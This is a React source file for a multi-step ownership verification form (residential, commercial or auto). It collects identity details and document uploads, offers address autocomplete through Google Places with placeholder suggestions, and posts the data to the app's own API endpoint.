"use client"

import type React from "react"
import { useEffect, useState } from "react"
import { useNavigate, useSearchParams } from "react-router-dom"
import { motion } from "framer-motion"
import { useFormLogic } from "../hooks/useFormLogic"
import EnhancedCalendar from "../components/EnhancedCalendar"
import BackButton from "../components/BackButton"

// Google Places API integration
declare global {
  interface Window {
    google: any
    initGooglePlaces: () => void
  }
}

const FormPage: React.FC = () => {
  const [searchParams] = useSearchParams()
  const formType = searchParams.get("type")
  const navigate = useNavigate()
  const [addressSuggestions, setAddressSuggestions] = useState<any[]>([])
  const [showSuggestions, setShowSuggestions] = useState(false)
  const [addressValue, setAddressValue] = useState("")
  const [isLoadingAddress, setIsLoadingAddress] = useState(false)

  const {
    ownerType,
    filePreviews,
    calendarVisible,
    calendarDate,
    handleOwnerTypeChange,
    handleFileUpload,
    clearFileInput,
    toggleCalendar,
    selectDate,
    handleMonthChange,
    handleYearChange,
  } = useFormLogic()

  // Initialize Google Places API
  useEffect(() => {
    const initializeGooglePlaces = () => {
      if (window.google && window.google.maps && window.google.maps.places) {
        console.log("Google Places API initialized successfully")
      }
    }

    // Load Google Maps API if not already loaded
    if (!window.google) {
      const script = document.createElement("script")
      script.src = `https://maps.googleapis.com/maps/api/js?key=AlzaSyCcp2w1C8JLtYY22NcSBoo&libraries=places&callback=initGooglePlaces`
      script.async = true
      script.defer = true

      window.initGooglePlaces = initializeGooglePlaces

      document.head.appendChild(script)
    } else {
      initializeGooglePlaces()
    }
  }, [])

  // Enhanced address autocomplete with better fallback
  const handleAddressChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value
    setAddressValue(value)

    if (value.length > 1) {
      setIsLoadingAddress(true)

      // Always provide immediate mock suggestions for better UX
      const mockSuggestions = [
        {
          place_id: `mock_${value}_1`,
          description: `${value} Main Street, New York, NY 10001, USA`,
          structured_formatting: {
            main_text: `${value} Main Street`,
            secondary_text: "New York, NY 10001, USA",
          },
        },
        {
          place_id: `mock_${value}_2`,
          description: `${value} Oak Avenue, Los Angeles, CA 90210, USA`,
          structured_formatting: {
            main_text: `${value} Oak Avenue`,
            secondary_text: "Los Angeles, CA 90210, USA",
          },
        },
        {
          place_id: `mock_${value}_3`,
          description: `${value} Pine Road, Chicago, IL 60601, USA`,
          structured_formatting: {
            main_text: `${value} Pine Road`,
            secondary_text: "Chicago, IL 60601, USA",
          },
        },
        {
          place_id: `mock_${value}_4`,
          description: `${value} Elm Street, Houston, TX 77001, USA`,
          structured_formatting: {
            main_text: `${value} Elm Street`,
            secondary_text: "Houston, TX 77001, USA",
          },
        },
        {
          place_id: `mock_${value}_5`,
          description: `${value} Maple Drive, Phoenix, AZ 85001, USA`,
          structured_formatting: {
            main_text: `${value} Maple Drive`,
            secondary_text: "Phoenix, AZ 85001, USA",
          },
        },
      ]

      // Set mock suggestions immediately
      setTimeout(() => {
        setAddressSuggestions(mockSuggestions)
        setShowSuggestions(true)
        setIsLoadingAddress(false)
      }, 300) // Small delay to show loading state

      // Try Google API in background if available
      if (window.google && window.google.maps && window.google.maps.places) {
        const service = new window.google.maps.places.AutocompleteService()

        const request = {
          input: value,
          types: ["address"],
          componentRestrictions: { country: ["us", "ca", "pk", "gb", "au"] },
        }

        service.getPlacePredictions(request, (predictions: any[], status: any) => {
          if (status === window.google.maps.places.PlacesServiceStatus.OK && predictions) {
            // Replace mock suggestions with real ones if API works
            setAddressSuggestions(predictions.slice(0, 5))
            setShowSuggestions(true)
          }
          // Keep mock suggestions if API fails
        })
      }
    } else {
      setShowSuggestions(false)
      setIsLoadingAddress(false)
      setAddressSuggestions([])
    }
  }

  const selectAddress = (suggestion: any) => {
    setAddressValue(suggestion.description)
    setShowSuggestions(false)
    setAddressSuggestions([])

    // Auto-extract street number if possible - improved logic
    const addressParts = suggestion.description.split(" ")
    const potentialNumber = addressParts[0]

    // Only extract if it's a valid positive number
    if (/^\d+$/.test(potentialNumber) && Number.parseInt(potentialNumber) > 0) {
      const addressNumberInput = document.getElementById("addressNumber") as HTMLInputElement
      if (addressNumberInput) {
        addressNumberInput.value = potentialNumber
      }
    } else {
      // Clear the address number field if no valid number found
      const addressNumberInput = document.getElementById("addressNumber") as HTMLInputElement
      if (addressNumberInput) {
        addressNumberInput.value = ""
      }
    }
  }

  // Close suggestions when clicking outside
  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      const target = event.target as HTMLElement
      if (!target.closest(".address-autocomplete")) {
        setShowSuggestions(false)
      }
    }

    document.addEventListener("mousedown", handleClickOutside)
    return () => document.removeEventListener("mousedown", handleClickOutside)
  }, [])

  useEffect(() => {
    // Show/hide form fields based on form type
    const formGroups = document.querySelectorAll(".form-group")
    formGroups.forEach((group) => {
      group.classList.add("hidden")
    })

    document.querySelectorAll(".form-group.common").forEach((group) => {
      group.classList.remove("hidden")
    })

    if (formType === "residential" || formType === "commercial") {
      document.querySelectorAll("#resCommFields .form-group").forEach((group) => {
        group.classList.remove("hidden")
      })
    } else if (formType === "auto") {
      document.querySelectorAll("#autoFields .form-group").forEach((group) => {
        group.classList.remove("hidden")
      })
    }

    if (ownerType === "other") {
      document.querySelectorAll("#ownerFields .form-group").forEach((group) => {
        group.classList.remove("hidden")
      })
    }
  }, [formType, ownerType])

  const handleSubmit = (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault()
    const formData = new FormData(event.currentTarget)
    const dto = Object.fromEntries(formData.entries())
    dto.todayDate = new Date().toLocaleDateString()
    dto.address = addressValue // Include the selected address
    console.log("Form submission data:", dto)

    fetch("/api/form", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(dto),
    })
      .then((response) => response.json())
      .then((data) => {
        console.log("Success:", data)
        // Handle success (show success message, redirect, etc.)
      })
      .catch((error) => {
        console.error("Error:", error)
        // Handle error (show error message, etc.)
      })
  }

  return (
    <div className="page-container">
      <BackButton />

      <motion.form
        id="verificationForm"
        method="post"
        action="send_email.php"
        encType="multipart/form-data"
        className={formType ? "" : "hidden"}
        onSubmit={handleSubmit}
        initial={{ opacity: 0, y: 50 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.6 }}
      >
        <motion.h2
          id="formTitle"
          className="common-header"
          initial={{ opacity: 0, y: -20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2 }}
        >
          {formType && formType.charAt(0).toUpperCase() + formType.slice(1)} Verification
        </motion.h2>

        <motion.div
          className="form-group common"
          initial={{ opacity: 0, x: -50 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.3 }}
        >
          <label htmlFor="fullName">Full Name:</label>
          <div className="input-wrapper">
            <i className="fas fa-user input-icon"></i>
            <input
              type="text"
              id="fullName"
              name="fullName"
              placeholder="Last, First, Middle Initial"
              required
              style={{ paddingLeft: "3rem" }}
            />
          </div>
        </motion.div>

        <motion.div
          className="form-group common address-autocomplete"
          initial={{ opacity: 0, x: -50 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.4 }}
        >
          <label htmlFor="address">Address:</label>
          <div className="input-wrapper">
            <i className="fas fa-map-marker-alt input-icon"></i>
            <input
              type="text"
              id="address"
              name="address"
              placeholder="Start typing your address..."
              value={addressValue}
              onChange={handleAddressChange}
              autoComplete="off"
              required
              style={{ paddingLeft: "3rem", paddingRight: isLoadingAddress ? "3rem" : "1rem" }}
            />
            {isLoadingAddress && (
              <div className="loading-spinner">
                <div className="loading"></div>
              </div>
            )}
          </div>

          {showSuggestions && addressSuggestions.length > 0 && (
            <motion.div
              className="google-places-suggestions"
              initial={{ opacity: 0, y: -10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -10 }}
              transition={{ duration: 0.2 }}
            >
              {addressSuggestions.map((suggestion, index) => (
                <motion.div
                  key={suggestion.place_id || index}
                  className="google-places-suggestion"
                  onClick={() => selectAddress(suggestion)}
                  initial={{ opacity: 0, x: -20 }}
                  animate={{ opacity: 1, x: 0 }}
                  transition={{ delay: index * 0.05 }}
                  whileHover={{ backgroundColor: "var(--accent-purple)" }}
                >
                  <i className="fas fa-map-marker-alt suggestion-icon"></i>
                  <div className="suggestion-content">
                    <div className="suggestion-main">
                      {suggestion.structured_formatting?.main_text || suggestion.description}
                    </div>
                    {suggestion.structured_formatting?.secondary_text && (
                      <div className="suggestion-secondary">{suggestion.structured_formatting.secondary_text}</div>
                    )}
                  </div>
                </motion.div>
              ))}
            </motion.div>
          )}
        </motion.div>

        <motion.div
          className="form-group common"
          initial={{ opacity: 0, x: -50 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.45 }}
        >
          <label htmlFor="addressNumber">Address Number:</label>
          <div className="input-wrapper">
            <i className="fas fa-hashtag input-icon"></i>
            <input
              type="number"
              id="addressNumber"
              name="addressNumber"
              placeholder="Street number"
              pattern="[0-9]*"
              inputMode="numeric"
              min="1"
              style={{ paddingLeft: "3rem" }}
            />
          </div>
        </motion.div>

        <motion.div
          className="form-group common"
          initial={{ opacity: 0, x: -50 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.5 }}
        >
          <label htmlFor="phoneNumber">Phone Number:</label>
          <div className="input-wrapper">
            <i className="fas fa-phone input-icon"></i>
            <input
              type="tel"
              id="phoneNumber"
              name="phoneNumber"
              placeholder="(000) 000-0000"
              pattern="[0-9]*"
              inputMode="numeric"
              style={{ paddingLeft: "3rem" }}
            />
          </div>
        </motion.div>

        <motion.div
          className="form-group common"
          initial={{ opacity: 0, x: -50 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.6 }}
        >
          <label htmlFor="email">Email:</label>
          <div className="input-wrapper">
            <i className="fas fa-envelope input-icon"></i>
            <input type="email" id="email" name="email" placeholder="your@email.com" style={{ paddingLeft: "3rem" }} />
          </div>
        </motion.div>

        <motion.div
          className="form-group common calendar-container"
          initial={{ opacity: 0, x: -50 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.7 }}
        >
          <label htmlFor="birthDate">Birth Date:</label>
          <div className="input-wrapper">
            <i className="fas fa-calendar input-icon"></i>
            <input
              type="text"
              id="birthDate"
              name="birthDate"
              placeholder="Select your birth date"
              className="calendar-input"
              readOnly
              onClick={() => toggleCalendar("birth")}
              style={{ paddingLeft: "3rem", cursor: "pointer" }}
            />
          </div>
          <EnhancedCalendar
            type="birth"
            visible={calendarVisible["birth"]}
            date={calendarDate["birth"]}
            selectDate={selectDate}
            handleMonthChange={handleMonthChange}
            handleYearChange={handleYearChange}
          />
        </motion.div>

        <motion.div
          className="form-group common"
          initial={{ opacity: 0, x: -50 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.8 }}
        >
          <label htmlFor="ownerType">Ownership:</label>
          <div className="input-wrapper">
            <i className="fas fa-user-tag input-icon"></i>
            <select id="ownerType" name="ownerType" onChange={handleOwnerTypeChange} style={{ paddingLeft: "3rem" }}>
              <option value="">Select ownership type...</option>
              <option value="myself">Myself</option>
              <option value="other">Other</option>
            </select>
          </div>
        </motion.div>

        {ownerType === "other" && (
          <motion.div
            id="ownerFields"
            initial={{ opacity: 0, height: 0 }}
            animate={{ opacity: 1, height: "auto" }}
            transition={{ duration: 0.3 }}
          >
            <div className="form-group">
              <label htmlFor="ownerFullName">Owner's Name:</label>
              <div className="input-wrapper">
                <i className="fas fa-user input-icon"></i>
                <input
                  type="text"
                  id="ownerFullName"
                  name="ownerFullName"
                  placeholder="Owner's full name"
                  style={{ paddingLeft: "3rem" }}
                />
              </div>
            </div>
            <div className="form-group">
              <label htmlFor="ownerPhone">Owner's Phone:</label>
              <div className="input-wrapper">
                <i className="fas fa-phone input-icon"></i>
                <input
                  type="tel"
                  id="ownerPhone"
                  name="ownerPhone"
                  pattern="[0-9]*"
                  inputMode="numeric"
                  placeholder="(000) 000-0000"
                  style={{ paddingLeft: "3rem" }}
                />
              </div>
            </div>
          </motion.div>
        )}

        {/* Auto-specific fields */}
        {formType === "auto" && (
          <motion.div id="autoFields" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.9 }}>
            <div className="form-group">
              <label htmlFor="aaaId">
                AAA Membership:
                <br />
                <small>(Leave blank if you don't have AAA membership)</small>
              </label>
              <div className="input-wrapper">
                <i className="fas fa-id-card input-icon"></i>
                <input
                  type="text"
                  id="aaaId"
                  name="aaaId"
                  placeholder="AAA membership number"
                  style={{ paddingLeft: "3rem" }}
                />
              </div>
            </div>

            <div className="form-group">
              <label htmlFor="insurancePolicy">Insurance Policy Number:</label>
              <div className="input-wrapper">
                <i className="fas fa-shield-alt input-icon"></i>
                <input
                  type="text"
                  id="insurancePolicy"
                  name="insurancePolicy"
                  placeholder="Policy number"
                  style={{ paddingLeft: "3rem" }}
                />
              </div>
            </div>

            <div className="form-group">
              <label htmlFor="vin">VIN:</label>
              <div className="input-wrapper">
                <i className="fas fa-car input-icon"></i>
                <input
                  type="text"
                  id="vin"
                  name="vin"
                  placeholder="17-character VIN"
                  maxLength={17}
                  style={{ paddingLeft: "3rem" }}
                />
              </div>
            </div>

            <div className="file-upload-container">
              <label htmlFor="registration">Registration (file upload):</label>
              <input
                type="file"
                id="registration"
                name="registration"
                accept=".pdf,.doc,.docx,.jpg,.jpeg,.png"
                onChange={handleFileUpload}
              />
              {filePreviews["registration"] && (
                <motion.div
                  className="file-preview"
                  initial={{ opacity: 0, scale: 0.9 }}
                  animate={{ opacity: 1, scale: 1 }}
                >
                  <span className="fileName">{filePreviews["registration"]}</span>
                  <button type="button" className="delete-file" onClick={() => clearFileInput("registration")}>
                    ×
                  </button>
                </motion.div>
              )}
            </div>

            <div className="file-upload-container">
              <label htmlFor="licensePlate">License Plate Photo:</label>
              <input
                type="file"
                id="licensePlate"
                name="licensePlate"
                accept=".pdf,.doc,.docx,.jpg,.jpeg,.png"
                onChange={handleFileUpload}
              />
              {filePreviews["licensePlate"] && (
                <motion.div
                  className="file-preview"
                  initial={{ opacity: 0, scale: 0.9 }}
                  animate={{ opacity: 1, scale: 1 }}
                >
                  <span className="fileName">{filePreviews["licensePlate"]}</span>
                  <button type="button" className="delete-file" onClick={() => clearFileInput("licensePlate")}>
                    ×
                  </button>
                </motion.div>
              )}
            </div>
          </motion.div>
        )}

        {/* Residential/Commercial fields */}
        {(formType === "residential" || formType === "commercial") && (
          <motion.div id="resCommFields" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.9 }}>
            <div className="form-group">
              <label htmlFor="propertyType">Property Type:</label>
              <div className="input-wrapper">
                <i className="fas fa-building input-icon"></i>
                <select id="propertyType" name="propertyType" style={{ paddingLeft: "3rem" }}>
                  <option value="">Select property type...</option>
                  <option value="singleFamily">Single-family</option>
                  <option value="condo">Condo</option>
                  <option value="apartment">Apartment</option>
                  <option value="office">Office</option>
                  <option value="retail">Retail</option>
                  <option value="industrial">Industrial</option>
                </select>
              </div>
            </div>

            <div className="file-upload-container">
              <label htmlFor="proofOfResidency">
                Proof of Residency:
                <br />
                <small>(e.g., utility bill, lease agreement)</small>
              </label>
              <input
                type="file"
                id="proofOfResidency"
                name="proofOfResidency"
                accept=".pdf,.doc,.docx,.jpg,.jpeg,.png"
                onChange={handleFileUpload}
              />
              {filePreviews["proofOfResidency"] && (
                <motion.div
                  className="file-preview"
                  initial={{ opacity: 0, scale: 0.9 }}
                  animate={{ opacity: 1, scale: 1 }}
                >
                  <span className="fileName">{filePreviews["proofOfResidency"]}</span>
                  <button type="button" className="delete-file" onClick={() => clearFileInput("proofOfResidency")}>
                    ×
                  </button>
                </motion.div>
              )}
            </div>
          </motion.div>
        )}

        <motion.div
          className="form-group common"
          initial={{ opacity: 0, x: -50 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 1.0 }}
        >
          <div className="file-upload-container">
            <label htmlFor="id">ID or Driver's License:</label>
            <input type="file" id="id" name="id" accept=".pdf,.doc,.docx,.jpg,.jpeg,.png" onChange={handleFileUpload} />
            {filePreviews["id"] && (
              <motion.div
                className="file-preview"
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
              >
                <span className="fileName">{filePreviews["id"]}</span>
                <button type="button" className="delete-file" onClick={() => clearFileInput("id")}>
                  ×
                </button>
              </motion.div>
            )}
          </div>
        </motion.div>

        <motion.div
          className="form-group common"
          initial={{ opacity: 0, x: -50 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 1.1 }}
        >
          <label htmlFor="techId">
            Reference Code:
            <br />
            <small>(Contact support if not provided)</small>
          </label>
          <div className="input-wrapper">
            <i className="fas fa-code input-icon"></i>
            <input
              type="text"
              id="techId"
              name="techId"
              placeholder="Reference code"
              required
              style={{ paddingLeft: "3rem" }}
            />
          </div>
        </motion.div>

        <motion.div
          className="bottomButtonContainer"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 1.2 }}
          style={{ display: "flex", gap: "1rem", marginTop: "2rem" }}
        >
          <motion.button
            type="button"
            onClick={() => navigate(-1)}
            whileHover={{ scale: 1.02 }}
            whileTap={{ scale: 0.98 }}
            style={{
              background: "var(--border-medium)",
              color: "var(--text-primary)",
              flex: 1,
            }}
          >
            <i className="fas fa-arrow-left" style={{ marginRight: "0.5rem" }}></i>
            Back
          </motion.button>
          <motion.button
            type="submit"
            className="submitButton"
            whileHover={{ scale: 1.02 }}
            whileTap={{ scale: 0.98 }}
            style={{ flex: 2 }}
          >
            <i className="fas fa-check" style={{ marginRight: "0.5rem" }}></i>
            Submit Verification
          </motion.button>
        </motion.div>
      </motion.form>
    </div>
  )
}

export default FormPage
